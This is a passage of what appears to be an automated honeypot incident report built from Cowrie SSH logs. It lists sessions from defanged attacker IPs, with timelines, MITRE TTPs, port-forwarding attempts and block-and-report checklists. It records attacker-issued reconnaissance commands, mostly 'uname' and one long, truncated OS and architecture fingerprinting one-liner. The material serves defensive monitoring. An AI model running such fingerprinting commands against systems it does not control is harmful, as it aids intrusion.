| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:23` | `cowrie.session.connect` |
| `2026-08-23 12:48:23` | `cowrie.client.version` |
| `2026-08-23 12:48:23` | `cowrie.client.kex` |
| `2026-08-23 12:48:24` | `cowrie.login.success` |
| `2026-08-23 12:48:25` | `cowrie.session.params` |
| `2026-08-23 12:48:25` | `cowrie.command.input` |
| `2026-08-23 12:48:25` | `cowrie.log.closed` |
| `2026-08-23 12:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fe68818d4e0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:26` | `cowrie.session.connect` |
| `2026-08-23 12:48:26` | `cowrie.client.version` |
| `2026-08-23 12:48:27` | `cowrie.client.kex` |
| `2026-08-23 12:48:27` | `cowrie.login.success` |
| `2026-08-23 12:48:28` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:48:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:48:28` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b37c963432d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:28` | `cowrie.session.connect` |
| `2026-08-23 12:48:28` | `cowrie.client.version` |
| `2026-08-23 12:48:28` | `cowrie.client.kex` |
| `2026-08-23 12:48:29` | `cowrie.login.success` |
| `2026-08-23 12:48:30` | `cowrie.session.params` |
| `2026-08-23 12:48:30` | `cowrie.command.input` |
| `2026-08-23 12:48:30` | `cowrie.log.closed` |
| `2026-08-23 12:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-364bd013d89c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:30` | `cowrie.session.connect` |
| `2026-08-23 12:48:30` | `cowrie.client.version` |
| `2026-08-23 12:48:31` | `cowrie.client.kex` |
| `2026-08-23 12:48:31` | `cowrie.login.success` |
| `2026-08-23 12:48:32` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:48:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:48:32` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4935659e6f5f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:34` | `cowrie.session.connect` |
| `2026-08-23 12:48:34` | `cowrie.client.version` |
| `2026-08-23 12:48:34` | `cowrie.client.kex` |
| `2026-08-23 12:48:34` | `cowrie.login.success` |
| `2026-08-23 12:48:35` | `cowrie.session.params` |
| `2026-08-23 12:48:35` | `cowrie.command.input` |
| `2026-08-23 12:48:35` | `cowrie.log.closed` |
| `2026-08-23 12:48:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95e9039d540

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:34` | `cowrie.session.connect` |
| `2026-08-23 12:48:34` | `cowrie.client.version` |
| `2026-08-23 12:48:34` | `cowrie.client.kex` |
| `2026-08-23 12:48:36` | `cowrie.login.success` |
| `2026-08-23 12:48:37` | `cowrie.session.params` |
| `2026-08-23 12:48:37` | `cowrie.command.input` |
| `2026-08-23 12:48:37` | `cowrie.command.input` |
| `2026-08-23 12:48:37` | `cowrie.command.input` |
| `2026-08-23 12:48:37` | `cowrie.command.input` |
| `2026-08-23 12:48:37` | `cowrie.command.input` |
| `2026-08-23 12:48:37` | `cowrie.command.success` |
| `2026-08-23 12:48:37` | `cowrie.command.input` |
| `2026-08-23 12:48:37` | `cowrie.command.input` |
| `2026-08-23 12:48:37` | `cowrie.command.input` |
| `2026-08-23 12:48:37` | `cowrie.command.input` |
| `2026-08-23 12:48:37` | `cowrie.log.closed` |
| `2026-08-23 12:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ca1cc96d14c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:39` | `cowrie.session.connect` |
| `2026-08-23 12:48:39` | `cowrie.client.version` |
| `2026-08-23 12:48:39` | `cowrie.client.kex` |
| `2026-08-23 12:48:40` | `cowrie.login.success` |
| `2026-08-23 12:48:40` | `cowrie.session.params` |
| `2026-08-23 12:48:40` | `cowrie.command.input` |
| `2026-08-23 12:48:41` | `cowrie.log.closed` |
| `2026-08-23 12:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda6261436a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:45` | `cowrie.session.connect` |
| `2026-08-23 12:48:45` | `cowrie.client.version` |
| `2026-08-23 12:48:45` | `cowrie.client.kex` |
| `2026-08-23 12:48:45` | `cowrie.login.success` |
| `2026-08-23 12:48:46` | `cowrie.session.params` |
| `2026-08-23 12:48:46` | `cowrie.command.input` |
| `2026-08-23 12:48:46` | `cowrie.log.closed` |
| `2026-08-23 12:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35d342c32a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:50` | `cowrie.session.connect` |
| `2026-08-23 12:48:50` | `cowrie.client.version` |
| `2026-08-23 12:48:50` | `cowrie.client.kex` |
| `2026-08-23 12:48:50` | `cowrie.login.success` |
| `2026-08-23 12:48:51` | `cowrie.session.params` |
| `2026-08-23 12:48:51` | `cowrie.command.input` |
| `2026-08-23 12:48:51` | `cowrie.log.closed` |
| `2026-08-23 12:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa981a364e59

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:55` | `cowrie.session.connect` |
| `2026-08-23 12:48:55` | `cowrie.client.version` |
| `2026-08-23 12:48:55` | `cowrie.client.kex` |
| `2026-08-23 12:48:56` | `cowrie.login.success` |
| `2026-08-23 12:48:56` | `cowrie.session.params` |
| `2026-08-23 12:48:56` | `cowrie.command.input` |
| `2026-08-23 12:48:57` | `cowrie.log.closed` |
| `2026-08-23 12:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e27e4119b52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:00` | `cowrie.session.connect` |
| `2026-08-23 12:49:00` | `cowrie.client.version` |
| `2026-08-23 12:49:00` | `cowrie.client.kex` |
| `2026-08-23 12:49:00` | `cowrie.login.success` |
| `2026-08-23 12:49:01` | `cowrie.session.params` |
| `2026-08-23 12:49:01` | `cowrie.command.input` |
| `2026-08-23 12:49:01` | `cowrie.log.closed` |
| `2026-08-23 12:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c58c1fc5cda

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:05` | `cowrie.session.connect` |
| `2026-08-23 12:49:05` | `cowrie.client.version` |
| `2026-08-23 12:49:05` | `cowrie.client.kex` |
| `2026-08-23 12:49:05` | `cowrie.login.success` |
| `2026-08-23 12:49:06` | `cowrie.session.params` |
| `2026-08-23 12:49:06` | `cowrie.command.input` |
| `2026-08-23 12:49:06` | `cowrie.log.closed` |
| `2026-08-23 12:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b33cb015cf6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:10` | `cowrie.session.connect` |
| `2026-08-23 12:49:10` | `cowrie.client.version` |
| `2026-08-23 12:49:11` | `cowrie.client.kex` |
| `2026-08-23 12:49:11` | `cowrie.login.success` |
| `2026-08-23 12:49:12` | `cowrie.session.params` |
| `2026-08-23 12:49:12` | `cowrie.command.input` |
| `2026-08-23 12:49:12` | `cowrie.log.closed` |
| `2026-08-23 12:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84020086b8f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:16` | `cowrie.session.connect` |
| `2026-08-23 12:49:16` | `cowrie.client.version` |
| `2026-08-23 12:49:16` | `cowrie.client.kex` |
| `2026-08-23 12:49:16` | `cowrie.login.success` |
| `2026-08-23 12:49:17` | `cowrie.session.params` |
| `2026-08-23 12:49:17` | `cowrie.command.input` |
| `2026-08-23 12:49:17` | `cowrie.log.closed` |
| `2026-08-23 12:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a4c29b5246

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:21` | `cowrie.session.connect` |
| `2026-08-23 12:49:21` | `cowrie.client.version` |
| `2026-08-23 12:49:21` | `cowrie.client.kex` |
| `2026-08-23 12:49:21` | `cowrie.login.success` |
| `2026-08-23 12:49:22` | `cowrie.session.params` |
| `2026-08-23 12:49:22` | `cowrie.command.input` |
| `2026-08-23 12:49:22` | `cowrie.log.closed` |
| `2026-08-23 12:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac413e39369

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:26` | `cowrie.session.connect` |
| `2026-08-23 12:49:26` | `cowrie.client.version` |
| `2026-08-23 12:49:26` | `cowrie.client.kex` |
| `2026-08-23 12:49:26` | `cowrie.login.success` |
| `2026-08-23 12:49:27` | `cowrie.session.params` |
| `2026-08-23 12:49:27` | `cowrie.command.input` |
| `2026-08-23 12:49:27` | `cowrie.log.closed` |
| `2026-08-23 12:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3824ed696d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:31` | `cowrie.session.connect` |
| `2026-08-23 12:49:31` | `cowrie.client.version` |
| `2026-08-23 12:49:31` | `cowrie.client.kex` |
| `2026-08-23 12:49:32` | `cowrie.login.success` |
| `2026-08-23 12:49:33` | `cowrie.session.params` |
| `2026-08-23 12:49:33` | `cowrie.command.input` |
| `2026-08-23 12:49:33` | `cowrie.log.closed` |
| `2026-08-23 12:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef9eaec561cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:37` | `cowrie.session.connect` |
| `2026-08-23 12:49:37` | `cowrie.client.version` |
| `2026-08-23 12:49:37` | `cowrie.client.kex` |
| `2026-08-23 12:49:37` | `cowrie.login.success` |
| `2026-08-23 12:49:38` | `cowrie.session.params` |
| `2026-08-23 12:49:38` | `cowrie.command.input` |
| `2026-08-23 12:49:38` | `cowrie.log.closed` |
| `2026-08-23 12:49:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-133448db5d2f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:41` | `cowrie.session.connect` |
| `2026-08-23 12:49:41` | `cowrie.client.version` |
| `2026-08-23 12:49:42` | `cowrie.client.kex` |
| `2026-08-23 12:49:42` | `cowrie.login.success` |
| `2026-08-23 12:49:43` | `cowrie.session.params` |
| `2026-08-23 12:49:43` | `cowrie.command.input` |
| `2026-08-23 12:49:43` | `cowrie.log.closed` |
| `2026-08-23 12:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39118a0a5517

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:46` | `cowrie.session.connect` |
| `2026-08-23 12:49:46` | `cowrie.client.version` |
| `2026-08-23 12:49:47` | `cowrie.client.kex` |
| `2026-08-23 12:49:47` | `cowrie.login.success` |
| `2026-08-23 12:49:48` | `cowrie.session.params` |
| `2026-08-23 12:49:48` | `cowrie.command.input` |
| `2026-08-23 12:49:48` | `cowrie.log.closed` |
| `2026-08-23 12:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ffacd825c54

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:52` | `cowrie.session.connect` |
| `2026-08-23 12:49:52` | `cowrie.client.version` |
| `2026-08-23 12:49:52` | `cowrie.client.kex` |
| `2026-08-23 12:49:52` | `cowrie.login.success` |
| `2026-08-23 12:49:53` | `cowrie.session.params` |
| `2026-08-23 12:49:53` | `cowrie.command.input` |
| `2026-08-23 12:49:53` | `cowrie.log.closed` |
| `2026-08-23 12:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c36fb51e8a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:49 |
| **Last Seen** | 2026-08-23 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:49:57` | `cowrie.session.connect` |
| `2026-08-23 12:49:57` | `cowrie.client.version` |
| `2026-08-23 12:49:57` | `cowrie.client.kex` |
| `2026-08-23 12:49:57` | `cowrie.login.success` |
| `2026-08-23 12:49:58` | `cowrie.session.params` |
| `2026-08-23 12:49:58` | `cowrie.command.input` |
| `2026-08-23 12:49:58` | `cowrie.log.closed` |
| `2026-08-23 12:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beeed79c3b67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:02` | `cowrie.session.connect` |
| `2026-08-23 12:50:02` | `cowrie.client.version` |
| `2026-08-23 12:50:02` | `cowrie.client.kex` |
| `2026-08-23 12:50:02` | `cowrie.login.success` |
| `2026-08-23 12:50:03` | `cowrie.session.params` |
| `2026-08-23 12:50:03` | `cowrie.command.input` |
| `2026-08-23 12:50:03` | `cowrie.log.closed` |
| `2026-08-23 12:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c033d6cfd615

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:07` | `cowrie.session.connect` |
| `2026-08-23 12:50:07` | `cowrie.client.version` |
| `2026-08-23 12:50:07` | `cowrie.client.kex` |
| `2026-08-23 12:50:07` | `cowrie.login.success` |
| `2026-08-23 12:50:08` | `cowrie.session.params` |
| `2026-08-23 12:50:08` | `cowrie.command.input` |
| `2026-08-23 12:50:08` | `cowrie.log.closed` |
| `2026-08-23 12:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-568c180a2b48

| Field | Detail |
|---|---|
| **Source IP** | `83.177.240[.]182` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:09` | `cowrie.session.connect` |
| `2026-08-23 12:50:09` | `cowrie.client.version` |
| `2026-08-23 12:50:09` | `cowrie.client.kex` |
